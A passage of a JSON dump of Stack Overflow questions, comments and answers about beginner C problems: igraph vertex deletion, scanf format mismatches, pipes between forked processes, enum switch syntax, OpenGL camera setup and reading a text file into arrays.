"user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/vfF38.jpg?s=128&g=1", "display_name": "Lucien S.", "link": "https://stackoverflow.com/users/1208142/lucien-s"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 385, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1459536867, "creation_date": 1459375676, "last_edit_date": 1459536867, "question_id": 36320610, "link": "https://stackoverflow.com/questions/36320610/delete-the-vertex-of-maximum-degree-in-a-igraph-graph-in-c", "title": "Delete the vertex of maximum degree in a iGraph graph in C", "body": "<p>I'd like to delete one randomly selected vertex of maximum degree in a graph using C's iGraph library. Here's my code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;igraph/igraph.h&gt;\n\nint main() {\n\n    float dens = .12;\n    int nbr_nodes = 100;\n    igraph_integer_t mdeg;\n    igraph_vector_t degree;\n    igraph_t g;\n\n    igraph_rng_seed(igraph_rng_default(), 400);\n    igraph_erdos_renyi_game(&amp;g, IGRAPH_ERDOS_RENYI_GNP, nbr_nodes, dens,IGRAPH_UNDIRECTED, IGRAPH_NO_LOOPS);\n\n    igraph_vector_init(&amp;degree,0);\n    igraph_degree(&amp;g, &amp;degree, igraph_vss_all(), IGRAPH_ALL, IGRAPH_NO_LOOPS);\n\n    igraph_maxdegree(&amp;g, &amp;mdeg, igraph_vss_all(), IGRAPH_ALL, IGRAPH_NO_LOOPS);\n\n    igraph_delete_vertices(&amp;g, ???);\n\n    return 0;\n}\n</code></pre>\n\n<p>I can find the maximum degree with:</p>\n\n<pre><code>igraph_maxdegree(&amp;g, &amp;mdeg, igraph_vss_all(), IGRAPH_ALL, IGRAPH_NO_LOOPS);\n</code></pre>\n\n<p>But I'm not sure how to find the ID corresponding to one of the max degree vertices.</p>\n\n<p>In short, I'm not sure what to put instead of ??? in :</p>\n\n<pre><code>igraph_delete_vertices(&amp;g, ???);\n</code></pre>\n\n<p>Thanks! Any clue is appreciated!</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 7, "creation_date": 1459375227, "post_id": 36320489, "comment_id": 60264334, "body": "Simple: <code>power</code> is an <code>unsigned char</code> and <code>%hu</code> tells <code>scanf</code> it&#39;s an <code>unsigned short</code>."}, {"owner": {"reputation": 336, "user_id": 6137045, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/21288fe9dad0cabb2cddf7c50488f84c?s=128&d=identicon&r=PG&f=1", "display_name": "Idan Levi", "link": "https://stackoverflow.com/users/6137045/idan-levi"}, "edited": false, "score": 0, "creation_date": 1459375722, "post_id": 36320489, "comment_id": 60264558, "body": "I&#39;ll add this comment to the actual post too. The platform is windows, but it&#39;s for an OS course so it&#39;s supposed to work on XV6 (simplified version of Unix version 6) as well. immibis - I tried %hhu and %u as well but I got the same result."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1459377590, "post_id": 36320489, "comment_id": 60265282, "body": "What is the input ? Try to replace <code>unsigned char power</code> by <code>unsigned short power</code>."}, {"owner": {"reputation": 336, "user_id": 6137045, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/21288fe9dad0cabb2cddf7c50488f84c?s=128&d=identicon&r=PG&f=1", "display_name": "Idan Levi", "link": "https://stackoverflow.com/users/6137045/idan-levi"}, "edited": false, "score": 0, "creation_date": 1459377981, "post_id": 36320489, "comment_id": 60265403, "body": "Unfortunately, the types are mandatory. The input is: 5 5.5 (enter) 4 4 (enter) 0 0 (enter)"}], "answers": [{"tags": [], "owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "is_accepted": true, "score": 1, "last_activity_date": 1459378584, "creation_date": 1459378584, "answer_id": 36321192, "question_id": 36320489, "link": "https://stackoverflow.com/questions/36320489/run-time-check-failure-2-stack-around-the-variable-power-was-corrupted/36321192#36321192", "title": "Run-Time Check Failure #2: Stack around the variable &#39;power&#39; was corrupted", "body": "<p>Replace </p>\n\n<pre><code>scanf(\"%hu%f\", &amp;power, &amp;coef);\n</code></pre>\n\n<p>by</p>\n\n<pre><code>int tmppower;\nscanf(\"%hu%f\", &amp;tmppower, &amp;coef);\nif (tmppower &gt; 255)\n{\n   printf(\"Invalid power\\n\");\n   exit(1);\n}\npower = (char)tmppower;\n</code></pre>\n"}], "owner": {"reputation": 336, "user_id": 6137045, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/21288fe9dad0cabb2cddf7c50488f84c?s=128&d=identicon&r=PG&f=1", "display_name": "Idan Levi", "link": "https://stackoverflow.com/users/6137045/idan-levi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 859, "favorite_count": 0, "accepted_answer_id": 36321192, "answer_count": 1, "score": 0, "last_activity_date": 1459378584, "creation_date": 1459375138, "last_edit_date": 1459378118, "question_id": 36320489, "link": "https://stackoverflow.com/questions/36320489/run-time-check-failure-2-stack-around-the-variable-power-was-corrupted", "title": "Run-Time Check Failure #2: Stack around the variable &#39;power&#39; was corrupted", "body": "<p>I just started using c again and I can't figure out where I currupt the stack.\nThere are a lot of similar questions but the answer is individual here.\nI hope someone can tell me what I did wrong.</p>\n\n<p>The platform is windows, but it's for an OS course so it's supposed to work on XV6 (simplified version of Unix version 6) as well.</p>\n\n<p>I have two structs:</p>\n\n<pre><code>struct elem {\n    unsigned char power; // the power of this item\n    float coef; // the coefficient\n};\nstruct item {\n    struct elem* elem;\n    struct item* next;\n};\n</code></pre>\n\n<p>and I have a global variable:</p>\n\n<pre><code>struct item* polynom1;\n</code></pre>\n\n<p>When I debug the following method, at the return statement I get an exception \"Run-Time Check Failure #2: Stack around the variable 'power' was corrupted\":</p>\n\n<pre><code>struct item* readPolynom()\n{\n    struct item* res = (struct item*)malloc(sizeof(struct item));\n    struct item* nextPoly = res;\n    unsigned char power;\n    float coef;\n\n    res-&gt;next = NULL;\n\n    do\n    {\n        scanf(\"%hu%f\", &amp;power, &amp;coef);\n\n        if (power != 0 || coef != 0)\n        {\n            nextPoly-&gt;elem = (struct elem*) malloc(sizeof(struct elem));\n            nextPoly-&gt;elem-&gt;coef = coef;\n            nextPoly-&gt;elem-&gt;power = power;\n            nextPoly-&gt;next = (struct item*) malloc(sizeof(struct  item));\n            nextPoly = nextPoly-&gt;next;\n        }\n    } while (power != 0 || coef != 0);\n\n    nextPoly = NULL;\n\n    return res;\n}\n</code></pre>\n\n<p>The input is: 5 5.5 (enter) 4 4 (enter) 0 0 (enter).\nImportant - 'res' gets the correct values.</p>\n\n<p>I tried replacing %hu by %hhu / %u as well but I got the same result.\nI also tried adding \"free(nextPoly);\" before \"nextPoly = NULL;\" - still the same.</p>\n\n<p>thanks in advance! :)</p>\n"}, {"tags": ["c", "pipe", "readfile"], "answers": [{"tags": [], "owner": {"reputation": 22751, "user_id": 2399879, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UxMS5.jpg?s=128&g=1", "display_name": "Crowman", "link": "https://stackoverflow.com/users/2399879/crowman"}, "is_accepted": true, "score": 2, "last_activity_date": 1459379363, "last_edit_date": 1459379363, "creation_date": 1459378268, "answer_id": 36321124, "question_id": 36320267, "link": "https://stackoverflow.com/questions/36320267/error-of-syncronism-in-sending-data-from-a-file-using-a-pipe/36321124#36321124", "title": "Error of syncronism in sending data from a file using a pipe", "body": "<p>You have two problems. </p>\n\n<p>Here:</p>\n\n<pre><code>write(fd[1],buffer,strlen(buffer)+1);\n</code></pre>\n\n<p>you're writing the terminating null to the file. When you call <code>read()</code>, if there are multiple lines available, it will read them all into your buffer, but when you then <code>printf()</code> them, it'll only print up to the first terminating null, so you never see them any of the lines after the first one. Adding your <code>sleep()</code> call prevents more than one line being written to the file before the other process has a chance to <code>read()</code>, so the problem doesn't manifest in that case.</p>\n\n<p>Solution: don't write the terminating null to your text file. At the same time, you can make your code a little more compact by changing:</p>\n\n<pre><code>fgets(buffer, BUFFER_SIZE, (FILE*)fp);\ndo{\n    write(fd[1],buffer,strlen(buffer)+1); \n}while(fgets(buffer, BUFFER_SIZE, (FILE*)fp) != NULL);\n</code></pre>\n\n<p>to:</p>\n\n<pre><code>while ( fgets(buffer, BUFFER_SIZE, fp) ) {\n     write(fd[1], buffer, strlen(buffer));\n}\n</code></pre>\n\n<p>Second, <code>read()</code> doesn't null terminate your string for you, so when you implement this solution, this call:</p>\n\n<pre><code>read(fd[0], read_msg, BUFFER_SIZE)\n</code></pre>\n\n<p>will not null-terminate <code>read_msg</code>. The solution is to check how many bytes <code>read()</code> actually read, and manually add the terminating null after that many bytes. Note that you will need to read at most one byte less than the buffer size, in case you fill it up, since you'll need room for the terminating null.</p>\n\n<p>Other comments:</p>\n\n<ol>\n<li><p>You don't check whether <code>fopen()</code> succeeds, and you should. Same thing for <code>write()</code> and <code>close()</code>. You do a good job checking the return values in other cases.</p></li>\n<li><p>The cast to <code>FILE *</code> in <code>fgets(buffer, BUFFER_SIZE, (FILE*)fp)</code> has no effect since <code>fp</code> is already of type <code>FILE *</code>. It should be omitted. </p></li>\n</ol>\n"}, {"tags": [], "owner": {"reputation": 379, "user_id": 2555383, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb3b0f9442e2200c9346a20d67134de3?s=128&d=identicon&r=PG", "display_name": "Bill Harper", "link": "https://stackoverflow.com/users/2555383/bill-harper"}, "is_accepted": false, "score": 2, "last_activity_date": 1459380726, "last_edit_date": 1495539958, "creation_date": 1459378773, "answer_id": 36321229, "question_id": 36320267, "link": "https://stackoverflow.com/questions/36320267/error-of-syncronism-in-sending-data-from-a-file-using-a-pipe/36321229#36321229", "title": "Error of syncronism in sending data from a file using a pipe", "body": "<p>See <a href=\"https://stackoverflow.com/questions/10139470/program-that-read-file-and-send-it-to-parent-process-with-pipe\">this post</a>'s accepted answer for a good explanation of why using fgets here can cause issues. </p>\n\n<p>You can take the following approach in the parent:</p>\n\n<pre><code>   if (pid&gt;0)\n{\n    int size, file_fd;\n    file_fd = fileno(fp);\n\n    close(fd[0]);\n    while((size = read(file_fd, buffer, BUFFER_SIZE)) != 0) {\n        write(fd[1],buffer,size); \n        //sleep(1);\n    }\nclose(fd[1]);\nwait(NULL);\n}\n</code></pre>\n\n<p>And in the child:</p>\n\n<pre><code>else{\n    close(fd[1]);\n    int size;\n    while((size = read(fd[0], read_msg, BUFFER_SIZE)) != 0){\n        write(1,read_msg, size);\n    } \n    close(fd[0]);\n    }\n    fflush(stdout);\n    fclose(fp);\n    return 0;\n}\n</code></pre>\n\n<p>Which reads in chunks. Note that I replaced:</p>\n\n<pre><code>printf(\"Child had read: %s\", read_msg);\n</code></pre>\n\n<p>For consistency since we're using lower-level system calls, and things can get tricky when you mix-up buffered I/O like printf with system calls. </p>\n\n<p>There are also some other more minor issues (e.g. you don't close the parent file), and you should run many more checks when reading/writing to verify there hasn't been an error, but this gets to the heart of your issue. </p>\n"}], "owner": {"reputation": 58, "user_id": 6125419, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/832cf111cdac15dced5dcb5a3da98b97?s=128&d=identicon&r=PG&f=1", "display_name": "I&#39;m just a poor boy", "link": "https://stackoverflow.com/users/6125419/im-just-a-poor-boy"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 49, "favorite_count": 1, "accepted_answer_id": 36321124, "answer_count": 2, "score": 0, "last_activity_date": 1459380726, "creation_date": 1459374151, "question_id": 36320267, "link": "https://stackoverflow.com/questions/36320267/error-of-syncronism-in-sending-data-from-a-file-using-a-pipe", "title": "Error of syncronism in sending data from a file using a pipe", "body": "<p>I have done this code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/wait.h&gt;\n#define BUFFER_SIZE 255\n#define PATH \"./test.txt\"\n\nint main(int argc, char **argv)\n{\n    char read_msg[BUFFER_SIZE];\n    FILE *fp;\n    char buffer[BUFFER_SIZE];\n    fp = fopen(PATH, \"r\");\n    int fd[2];\n    pid_t pid;\n    if(pipe(fd) == -1){\n        perror(\"Pipe failed\");\n        return 1;\n    }\n\n    pid=fork();\n    if (pid==-1)\n    {\n        perror(\"Fork failed\");\n        return 1;\n    }\n\n    if (pid&gt;0)\n    {\n        close(fd[0]);\n        fgets(buffer, BUFFER_SIZE, (FILE*)fp);\n        do{\n            write(fd[1],buffer,strlen(buffer)+1); \n            //sleep(1);\n        }while(fgets(buffer, BUFFER_SIZE, (FILE*)fp) != NULL);\n    close(fd[1]);\n    wait(NULL);\n}else{\n    close(fd[1]);\n    while(read(fd[0], read_msg, BUFFER_SIZE) != 0){\n    printf(\"Child had read: %s\", read_msg);\n    } \n    close(fd[0]);\n    }\n    return 0;\n}\n</code></pre>\n\n<p>This code must create a pipe between the father process and the child process.\nThe father process must read the file and send each line to the child process.\nThe child process prints the received lines.</p>\n\n<p>But this code have some error.\nIf I run like this I get only some lines of the text in the file.\nIf I run using the commented sleep(1) I get all lines of the text.</p>\n\n<p>Can anyone see the error?</p>\n"}, {"tags": ["c", "enums", "switch-statement"], "comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1459373521, "post_id": 36320096, "comment_id": 60263558, "body": "<code>Type **</code> is not a 2D array and it cannot represent one! It is a pointer to pointer to <code>Type</code>. And provide a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>."}, {"owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 0, "creation_date": 1459373610, "post_id": 36320096, "comment_id": 60263615, "body": "Where did you get <code>IsEmpty.</code> from?"}, {"owner": {"reputation": 247, "user_id": 5661576, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/92ec48405b79536dcb523ed0a6db0af4?s=128&d=identicon&r=PG&f=1", "display_name": "SomeoneWithAQuestion", "link": "https://stackoverflow.com/users/5661576/someonewithaquestion"}, "reply_to_user": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 0, "creation_date": 1459373647, "post_id": 36320096, "comment_id": 60263629, "body": "@immibis That was supposed to be Square. My bad!"}, {"owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1459373650, "post_id": 36320096, "comment_id": 60263631, "body": "@Olaf Are you saying it is not possible for an array of arrays to represent a 2D array? Because that&#39;s rubbish."}, {"owner": {"reputation": 3625, "user_id": 249552, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/kQlfx.png?s=128&g=1", "display_name": "jacob", "link": "https://stackoverflow.com/users/249552/jacob"}, "edited": false, "score": 0, "creation_date": 1459373752, "post_id": 36320096, "comment_id": 60263680, "body": "How are you initializing squares?"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 0, "creation_date": 1459373765, "post_id": 36320096, "comment_id": 60263688, "body": "@immibis: Where did I say that?? Where is an array of arrays in the question? <code>Type **</code> is a pointer to pointer. It can represent an array of <b>pointers</b> to <code>Type</code> at best, but not an &quot;array of array&quot; which very well is a 2D array. Please read the question and my comment correctly. If that still not helps, assume <code>int **p;</code> <code>*p</code> is a pointer. While for the correct pointer to a 2D array, it was <code>int (*p)[COLS];</code> where <code>*p</code> has type <code>int [COLS]</code>. Try this with a compliant compiler and warnings enabled."}, {"owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "edited": false, "score": 1, "creation_date": 1459373825, "post_id": 36320096, "comment_id": 60263719, "body": "<code>case Square.EMPTY:</code> -&gt; <code>case EMPTY:</code>."}, {"owner": {"reputation": 247, "user_id": 5661576, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/92ec48405b79536dcb523ed0a6db0af4?s=128&d=identicon&r=PG&f=1", "display_name": "SomeoneWithAQuestion", "link": "https://stackoverflow.com/users/5661576/someonewithaquestion"}, "reply_to_user": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "edited": false, "score": 0, "creation_date": 1459373915, "post_id": 36320096, "comment_id": 60263760, "body": "@RSahu Worked :) Appreciated"}], "answers": [{"tags": [], "owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "is_accepted": true, "score": 1, "last_activity_date": 1459374059, "creation_date": 1459374059, "answer_id": 36320243, "question_id": 36320096, "link": "https://stackoverflow.com/questions/36320096/enum-cant-find-whats-wrong/36320243#36320243", "title": "Enum. Can&#39;t find what&#39;s wrong", "body": "<p>There is no such thing as <code>Square.EMPTY</code> or <code>Square.WALL</code> in your code. Use:</p>\n\n<pre><code>switch(Square) {\n    case EMPTY:  // Juse EMPTY, not Square.EMPTY\n        countEmpty++;\n        break;\n\n    case WALL:\n        break;\n}\n</code></pre>\n"}], "owner": {"reputation": 247, "user_id": 5661576, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/92ec48405b79536dcb523ed0a6db0af4?s=128&d=identicon&r=PG&f=1", "display_name": "SomeoneWithAQuestion", "link": "https://stackoverflow.com/users/5661576/someonewithaquestion"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 38, "favorite_count": 0, "accepted_answer_id": 36320243, "answer_count": 1, "score": -1, "last_activity_date": 1459374059, "creation_date": 1459373383, "last_edit_date": 1459373632, "question_id": 36320096, "link": "https://stackoverflow.com/questions/36320096/enum-cant-find-whats-wrong", "title": "Enum. Can&#39;t find what&#39;s wrong", "body": "<p>In a header file:  </p>\n\n<pre><code>  typedef struct apartment_t* Apartment;\n  typedef enum { EMPTY, WALL } SquareType;\n\nstruct apartment_t {\n    SquareType** squares;\n    int width;\n    int length;\n    int price;\n};\n</code></pre>\n\n<p>in the source file:</p>\n\n<pre><code>int apartmentTotalArea(Apartment apartment) {\n\n    int countEmpty = 0;\n\n    for (int i=0;i&lt;apartment-&gt;length;i++)\n        for (int j=0;j&lt;apartment-&gt;width;j++) {\n            SquareType Square = apartment-&gt;squares[i][j];\n            switch(Square) {\n                case Square.EMPTY: // Bad\n                    countEmpty++;\n                    break;\n\n                case Square.WALL: // Bad\n                    break;\n            }\n        }\n</code></pre>\n\n<p>This function counts the empty spots in a given 2d array. I'm facing a problem in the switch, it'll mark both cases as bad statements. What's wrong with my code? Thank you.</p>\n"}, {"tags": ["c", "opengl", "matrix", "transformation", "projection"], "comments": [{"owner": {"reputation": 18146, "user_id": 646619, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/bd61a0f309ebc135d2661710c2faf379?s=128&d=identicon&r=PG", "display_name": "Colonel Thirty Two", "link": "https://stackoverflow.com/users/646619/colonel-thirty-two"}, "edited": false, "score": 1, "creation_date": 1459373011, "post_id": 36319925, "comment_id": 60263297, "body": "Most matrix functions (including <code>gluLookAt</code>) multiply the current matrix with the matrix that they generate, applying their transformation transformation on top of whatever was already on the stack. So it doesn&#39;t make much sense to call <code>gluLookAt</code> more than once without a <code>glLoadIdentity</code> in between. (Though, it doesn&#39;t make much sense to call any of the OpenGL matrix functions anymore, since they&#39;re removed from modern OpenGL)."}, {"owner": {"reputation": 962, "user_id": 1891266, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/83ed20378bcbcf07ccc4969c6bf9874b?s=128&d=identicon&r=PG", "display_name": "vcp", "link": "https://stackoverflow.com/users/1891266/vcp"}, "edited": false, "score": 0, "creation_date": 1459436873, "post_id": 36319925, "comment_id": 60296270, "body": "Have a look at answers here: <a href=\"http://gamedev.stackexchange.com/questions/41940/how-does-glulookat-work\" title=\"how does glulookat work\">gamedev.stackexchange.com/questions/41940/&hellip;</a>"}], "owner": {"reputation": 11, "user_id": 6136970, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2ba23fef75298fdf2058b4df5ccd89d0?s=128&d=identicon&r=PG&f=1", "display_name": "poihnipob", "link": "https://stackoverflow.com/users/6136970/poihnipob"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 709, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1459372648, "creation_date": 1459372648, "question_id": 36319925, "link": "https://stackoverflow.com/questions/36319925/how-to-setup-glulookat-and-glortho-in-opengl", "title": "How to setup gluLookat() and glOrtho() in openGL?", "body": "<p>I am new to openGL and have a hard time to understand how to actually parametrize the function gluLookat. I what it does but don't know how to know which parameters I should pass to that function and what consequences it will have.</p>\n\n<p>This is my current code and strangely enough I don't even see the axis I drew... I think it is due to the parameters I pass to the function gluLookAt();</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;math.h&gt;\n#include &lt;GL/glut.h&gt;\n\nvoid init(void)\n{\n    glClearColor(0.8, 0.8, 0.8, 0.0);  /* window color white */\nglEnable(GL_DEPTH_TEST);\n}\n\n\nvoid drawScene(void)\n{\n\nglClear(GL_COLOR_BUFFER_BIT|GL_DEPTH_BUFFER_BIT);\nglMatrixMode(GL_MODELVIEW);\nglLoadIdentity();\ngluLookAt(3.0,3.0,3.0, 0.0,0.0,0.0, 0.0,1.0,0.0);\n\n//used some random parameters...\ngluLookAt(0.0, 0.0, 0.0, 5.0, 5.0, 5.0, 0, 1, 0);\n\n//axis\n//x\nglColor3f(1.0,0.0,0.0);\nglLineWidth(1.0);\nglBegin(GL_LINES);\n    glVertex3d(0.0,0.0,0.0);\n    glVertex3d(1.0,0.0,0.0);\nglEnd();\n\n//y\nglColor3f(0.0,1.0,0.0);\nglLineWidth(1.0);\nglBegin(GL_LINES);\n    glVertex3d(0.0,0.0,0.0);\n    glVertex3d(1.0,0.0,0.0);\nglEnd();\n\n//z\nglColor3f(0.0,0.0,1.0);\nglLineWidth(1.0);\nglBegin(GL_LINES);\n    glVertex3d(0.0,0.0,0.0);\n    glVertex3d(1.0,0.0,0.0);\nglEnd();\nglFlush();\n}\n\nvoid herschaal(){\n\nglViewport(0,0,500,500);\nglMatrixMode(GL_PROJECTION);\nglOrtho(-10, 10, 10, -10, 10, -10);\nglLoadIdentity();\n\n}\n\n\nint main( int argc, char * argv[])\n{\n\nglutInit(&amp;argc, argv);\nglutInitDisplayMode(GLUT_SINGLE | GLUT_RGB | GLUT_DEPTH );\nglutInitWindowPosition(50, 100);\nglutInitWindowSize(500, 500);\nglutCreateWindow(\"mijn test\");\nglutReshapeFunc(herschaal);\ninit();\nglutDisplayFunc(drawScene);\nglutMainLoop();\n\nreturn 0;\n}\n</code></pre>\n"}, {"tags": ["c", "arrays", "file", "fgets", "scanf"], "comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1459372260, "post_id": 36319712, "comment_id": 60262911, "body": "Alternative approach: use <code>fgets()</code> and <i>then</i> parse the buffer."}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1459373649, "post_id": 36319712, "comment_id": 60263630, "body": "<code>while ( fscanf(&quot;%s,%s%d&quot;, last, first, &amp;num) == 3 )</code>."}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1459373676, "post_id": 36319712, "comment_id": 60263643, "body": "And for parsing the buffer, look at <code>strtok</code> with <code>delims = &quot;, \\t\\n&quot;;</code> (that&#39;s <i>comma, space, tab, newline</i>)"}], "answers": [{"tags": [], "owner": {"reputation": 119882, "user_id": 3545273, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/RDWxl.png?s=128&g=1", "display_name": "Serge Ballesta", "link": "https://stackoverflow.com/users/3545273/serge-ballesta"}, "is_accepted": false, "score": 0, "last_activity_date": 1459375372, "creation_date": 1459375372, "answer_id": 36320553, "question_id": 36319712, "link": "https://stackoverflow.com/questions/36319712/how-to-scan-txt-file-for-data-and-store-in-arrays-in-c/36320553#36320553", "title": "How to scan txt file for data and store in arrays in C?", "body": "<p>You do not read those special characters. They happen to exist in your array, because it is an uninitialized array of non static duration. So when you reach the end of file, <strong>as you do not test the result of your input functions</strong> you leave the garbage in the buffers and later print that garbage.</p>\n\n<p>What should you do?</p>\n\n<p>First throw away your strange format in fscanf: the first is not very different from a <code>fgets</code>, and the second expects an end of line followed with a <code>s</code> character.</p>\n\n<p>So if you want to read line by line, just use a <code>fgets</code> an count the number of lines actually read:</p>\n\n<pre><code>for(i=0; i&lt;100; i++)\n    {\n        int l;\n        if (NULL == fgets(line[i], sizeof(line[i]), stdin)) break;\n        l = strlen(line[i]) - 1;\n        while ((l&gt;0) &amp;&amp; (strchr(\" \\t\\r\\n\", line[i][l]) != NULL) {\n            line[i][l--] = '\\0'; //Remove any trailing 'white space' characters\n    }\nnblines = i - 1;   // number or lines actually read\n</code></pre>\n\n<p>But as you know the format of lines and as it is simple you could directly scan:</p>\n\n<pre><code>char name[100][41], firstname[100][41];\nint age(100);\nint i, numlig;\n\nfor(numlig=0; numlig&lt;100; numlig++) {\n    if (3 != scanf(\"%[^,],%s%d\", name[i], lastname[i], age + i)) {\n        break;\n    }\n}\n</code></pre>\n\n<p>Or if you want to be strict on what happen on each line:</p>\n\n<pre><code>char name[100][41], firstname[100][41], line[41];\nint age(100);\nint i, numlig;\n\nfor(numlig=0; numlig&lt;100; numlig++) {\n    if (NULL == fgets(line, sizeof(line), stdin)) { break; }\n    if (3 != sscanf(line, \"%[^,],%s%d\", name[i], lastname[i], age + i)) {\n        break;\n    }\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "is_accepted": false, "score": 0, "last_activity_date": 1459378055, "last_edit_date": 1459378055, "creation_date": 1459376889, "answer_id": 36320866, "question_id": 36319712, "link": "https://stackoverflow.com/questions/36319712/how-to-scan-txt-file-for-data-and-store-in-arrays-in-c/36320866#36320866", "title": "How to scan txt file for data and store in arrays in C?", "body": "<p>There are a number of ways you can accomplish reading and separating the data into <code>first</code>, <code>last</code>, and <code>age</code>. What makes most sense is to use a simple <code>struct</code> containing each of the names and age, and then create an array of struct to hold your data.</p>\n\n<p>There are few places where you will want to use <code>fscanf</code>. The <code>scanf</code> family of functions are very inflexible when handing anything except the <em>exact same format</em> for each line. Generally you will want to use 